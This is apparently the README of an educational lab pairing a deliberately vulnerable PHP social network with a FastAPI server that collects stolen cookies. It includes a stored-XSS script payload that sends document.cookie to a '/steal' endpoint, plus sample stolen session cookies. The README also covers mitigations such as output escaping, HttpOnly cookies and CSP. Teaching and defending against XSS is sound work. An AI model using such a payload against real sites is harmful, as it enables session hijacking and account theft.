# 🍪 XSS Cookie Stealer Lab

This repository contains a full **Cross-Site Scripting (XSS)** educational lab consisting of:

1. **A vulnerable PHP mini social network** (victim application)  
2. **A FastAPI attacker server** used to receive stolen cookies  
3. **A hacker-themed dashboard** to view cookies, search, paginate, copy, and export them

This lab is designed as a hands‑on demonstration of **Stored XSS + Cookie Exfiltration** attacks.

---

# 🧩 Project Structure

```
/Victim/       → Vulnerable PHP mini social network
/Attacker/      → FastAPI server (cookie stealer + dashboard-html page-)
README.md              → You are here
```

---

# ⚠️ Warning

This lab is **intentionally vulnerable**.  
Run it **ONLY locally**, never on a public server.

---

# 🚀 1. Running the Vulnerable PHP App (Victim)

## 📌 Requirements
- PHP 7+ or 8+
- Any Linux system (or WSL)

## ▶️ Start the PHP app

Inside the `php-victim-app` folder:

```bash
cd php-victim-app
php -S 127.0.0.1:3000
```

Victim website:

👉 **http://127.0.0.1:3000**

---

# 🚀 2. Running the FastAPI Attacker Server

## 📌 Requirements
- Python 3.10+
- FastAPI
- Uvicorn

Install dependencies:

```bash
pip install fastapi uvicorn
```

Run:

```bash
cd attacker-server
uvicorn main:app --reload --host 127.0.0.1 --port 8000
or
fastapi dev main.py
```

Attacker server:

👉 **http://127.0.0.1:8000**

### Endpoints

| Method | Path           | Description |
|--------|----------------|-------------|
| POST   | `/steal`       | Receives stolen cookies |
| GET    | `/cookies`     | Returns all stolen cookies |


---

# 🛰️ 3. XSS Payload

```html
<script>
fetch("http://127.0.0.1:8000/steal", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ session_cookie: document.cookie })
});
</script>
```

---

# 🖥️ 4. Attacker Dashboard

Located at:

```
attacker-server/dashboard.html
```

Features:
- 🍪 Cookie emoji  
- Terminal hacker theme  
- Auto-refresh  
- Search  
- Pagination  
- Copy button  
- Export CSV  

---

# 📝 5. Stolen Cookies File

Stored at:

```
attacker-server/stolen_cookies.txt
```

Example format:

```
PHPSESSID=abc123; session_user=koussay
PHPSESSID=xy9qd8; session_user=admin
```

---

# 🛡️ 6. Mitigation

### ✔ Escape output
```php
htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
```

### ✔ Secure cookies
Use `HttpOnly`, `Secure`, `SameSite`.

### ✔ Add CSP
```
Content-Security-Policy: default-src 'self'; script-src 'self';
```

---

# 📚 7. Educational Purpose

This project demonstrates:

- Stored XSS  
- Cookie theft  
- HttpOnly importance  
- CSP protection  

---

# 🧑‍💻 Author

**Koussay Dhifi**

---

# ⭐ License

MIT License — For educational use only.
